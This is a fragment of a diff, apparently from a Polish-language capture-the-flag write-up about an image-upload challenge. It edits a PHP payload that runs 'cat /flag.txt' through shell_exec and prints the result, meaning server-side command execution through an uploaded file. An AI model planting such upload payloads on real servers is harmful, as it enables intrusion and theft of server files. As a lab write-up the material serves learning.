@@ -6,7 +6,7 @@ Próba wysłania plik nie będącego zdjęciem, powoduje że pojawia się wiadom
 Kod:
 ```
 <?php
-$output = shell_exec('cat ../flag.txt');
+$output = shell_exec('cat /flag.txt');
 echo "<pre>$output</pre>";
 exit;
 ?>
